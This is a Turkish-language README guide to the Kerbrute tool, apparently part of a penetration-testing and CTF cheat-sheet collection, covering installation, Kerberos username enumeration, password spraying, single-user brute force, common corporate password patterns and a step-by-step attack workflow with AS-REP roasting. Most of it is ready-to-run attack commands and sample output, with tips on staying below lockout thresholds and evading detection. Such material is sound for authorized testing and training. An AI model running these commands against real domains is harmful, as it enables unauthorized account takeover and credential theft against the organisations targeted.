# 🔑 Kerbrute - Kerberos Kullanıcı Keşif Kılavuzu

[🇬🇧 English](../../README.md)

```
  ██╗  ██╗███████╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  █████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██║  ██╗███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
            Kerberos Ön Kimlik Doğrulama Kaba Kuvvet Aracı
```

<p align="center">
  <img src="https://img.shields.io/badge/Kerbrute-Kerberos-red?style=for-the-badge" alt="Kerbrute">
  <img src="https://img.shields.io/badge/User_Enumeration-blue?style=for-the-badge" alt="Enum">
  <img src="https://img.shields.io/badge/Password_Spray-green?style=for-the-badge" alt="Spray">
</p>

---

## 📋 İçindekiler

- [Kerbrute Nedir?](#-kerbrute-nedir)
- [Kurulum](#-kurulum)
- [Kullanıcı Keşfi (User Enumeration)](#-kullanıcı-keşfi-user-enumeration)
- [Parola Püskürtme (Password Spraying)](#-parola-püskürtme-password-spraying)
- [Kaba Kuvvet (Brute Force)](#-kaba-kuvvet-brute-force)
- [Hızlı Başvuru](#-hızlı-başvuru)
- [CTF İpuçları](#-ctf-i̇puçları)

---

## 🎯 Kerbrute Nedir?

**Kerbrute**, Kerberos ön kimlik doğrulama (pre-authentication) mekanizmasını kötüye kullanarak kullanıcı adlarını keşfetmek ve parola püskürtme saldırıları düzenlemek için tasarlanmıştır:

- 🔍 **Kullanıcı Keşfi** - Geçerli kimlik bilgilerine sahip olmadan doğrulanmış kullanıcı adlarını tespit edin!
- 🔐 **Parola Püskürtme (Spray)** - Tek bir parolayı yüzlerce farklı kullanıcı hesabına karşı test edin
- 💥 **Kaba Kuvvet (Brute Force)** - Tam kimlik bilgisi doğrulaması ve kaba kuvvet saldırısı
- 🚫 **Hesap Kilitleme Riski Yoktur** - Kerberos ön kimlik doğrulama başarısızlıkları Windows hesap kilitleme sayaçlarını tetiklemez

### Neden Kerbrute?

| Yöntem | Hesap Kilitlemeyi Tetikler mi? | Oluşturulan Log Seviyesi |
|--------|--------------------------------|--------------------------|
| LDAP Bind | Evet | Yüksek |
| SMB Auth | Evet | Yüksek |
| **Kerberos Pre-Auth** | **Hayır** | Minimum |

---

## 🚀 Kurulum

### Derlenmiş İkili Dosyayı (Binary) İndirme

```bash
# Linux
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile kerbrute.exe
```

### Kaynak Koddan Derleme (Go)

```bash
go install github.com/ropnop/kerbrute@latest
```

### Kurulumu Doğrulama

```bash
kerbrute --help
```

---

## 🔍 Kullanıcı Keşfi (User Enumeration)

### Temel Kullanım

```bash
# Kelime listesinden kullanıcı adlarını tespit etme
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# Etki alanı denetleyicisi ana makine adı ile
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```

### Çıktı Seçenekleri

```bash
# Ayrıntılı (verbose) mod
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# Sonuçları dosyaya kaydetme
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# JSON formatında çıktı alma
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt --json -o results.json
```

### İş Parçacığı (Threading) Ayarları

```bash
# İş parçacığı sayısını artırma (varsayılan: 10)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 50

# Güvenli / yavaş tarama (gecikmeli)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 20 --delay 100
```

### Örnek Çıktı

```
2024/01/15 10:30:00 >  [+] VALID USERNAME:    admin@domain.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:    john@domain.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:    svc_sql@domain.local
```

---

## 🔐 Parola Püskürtme (Password Spraying)

### Temel Püskürtme

```bash
# Tüm kullanıcılara karşı tek bir parola test etme
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# Başka bir yaygın parola denemesi
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

### Birden Fazla Parola Püskürtme

```bash
# Güvenli döngü (her parola denemesi arasında bekleme süresi koyarak)
for pass in $(cat passwords.txt); do
    echo "Deneniyor: $pass"
    kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt "$pass"
    sleep 300  # Denemeler arasında 5 dakika bekle
done
```

### Çıktıyı Kaydetme

```bash
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass123!' -o valid_creds.txt
```

### Örnek Başarılı Çıktı

```
2024/01/15 10:35:00 >  [+] VALID LOGIN:    john@domain.local:Password123!
2024/01/15 10:35:01 >  [+] VALID LOGIN:    admin@domain.local:Password123!
```

### Güvenli Püskürtme Kuralları

```bash
# Öncelikle parola politikasını kontrol edin!
crackmapexec ldap DC01 -u user -p pass --password-policy

# Yavaş ve sessiz saldırı (düşük thread ve gecikme ile)
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass!' -t 5 --delay 500
```

---

## 💥 Kaba Kuvvet (Brute Force)

### Tek Kullanıcıya Kaba Kuvvet

```bash
# Belirli bir kullanıcının parolasını kırma
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

### Kullanıcı:Parola Listesi ile Deneme

```bash
# Kullanıcı:parola çiftlerinin bulunduğu bir liste ile
kerbrute bruteforce -d domain.local --dc 10.10.10.10 creds.txt

# creds.txt formatı:
# admin:Password1
# john:Summer2024
```

---

## 📊 Hızlı Başvuru

### Komutlar

| Komut | Açıklama |
|-------|----------|
| `userenum` | Geçerli kullanıcı adlarını keşfet |
| `passwordspray` | Kullanıcılara karşı tek bir parolayı test et |
| `bruteuser` | Tek bir kullanıcı için kaba kuvvet yap |
| `bruteforce` | Kullanıcı:parola kombinasyonlarını dene |

### Önemli Seçenekler

| Seçenek | Açıklama |
|---------|----------|
| `-d` | Etki alanı (Domain) adı |
| `--dc` | DC IP adresi veya ana makine adı |
| `-t` | İş parçacığı sayısı (varsayılan: 10) |
| `-o` | Çıktı dosyası |
| `-v` | Ayrıntılı (verbose) mod |
| `--delay` | İstekler arası gecikme (ms) |

### Kullanıcı Keşif Komutları

```bash
# Temel keşif
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# Çıktı dosyası ile
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -o valid.txt

# Yüksek hızlı keşif
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -t 50
```

### Parola Püskürtme Komutları

```bash
# Temel püskürtme
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password!'

# Güvenli / sessiz püskürtme
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Pass!' -t 5 --delay 500
```

### Kullanıcı Adı Listeleri (Wordlists)

```bash
# Yaygın isimler
/usr/share/seclists/Usernames/Names/names.txt

# En popüler kullanıcı adları
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Özel liste oluşturma
echo -e "administrator\nadmin\nuser\njohn\njane" > users.txt
```

### Yaygın Şirket Parola Kalıpları

```
Mevsim+Yıl: Summer2024!, Winter2024!, Fall2024!
Şirket+Sayı: SirketAdi123!, Sirket2024!
Genel Kalıplar: Password1, Welcome1, P@ssw0rd
```

---

## 🎯 CTF İpuçları

1. **Her zaman önce kullanıcı keşfi yapın** - Kimlik bilgisi olmadan geçerli kullanıcıları bulun!
2. **AS-REP Roasting kontrolü yapın** - Bulunan kullanıcılar arasında ön kimlik doğrulaması kapalı olanları arayın.
3. **Dikkatli püskürtün** - Her deneme grubu arasında bekleme süresi koyun.
4. **Hesap kilitleme politikasını öğrenin** - Kilitleme eşiğini (lockout threshold) aşmayın.
5. **Gecikme (delay) ekleyin** - Tespit mekanizmalarından kaçının.

### Örnek Saldırı İş Akışı

```bash
# 1. Kullanıcı adlarını keşfet
kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt -o users.txt

# 2. Ön kimlik doğrulaması kapalı kullanıcıları denetle (AS-REP Roast)
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# 3. Kalan kullanıcılara parola püskürtme uygula
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

---

## 📚 Kaynaklar

- [Kerbrute GitHub](https://github.com/ropnop/kerbrute)
- [ropnop Blog](https://blog.ropnop.com/)

### İlgili Kılavuzlar
- [AD Saldırı Metodolojisi](../../AD-Attack-Methodology/translations/README.tr.md)
- [Rubeus](../../Rubeus/translations/README.tr.md)
- [CrackMapExec](../../CrackMapExec/translations/README.tr.md)

---

<p align="center">
  <b>🔑 Kullanıcıları Keşfedin, Parolaları Püskürtün!</b><br>
  <i>Kerbrute - Etki alanına sessizce sızmanın en güvenli yolu</i>
</p>
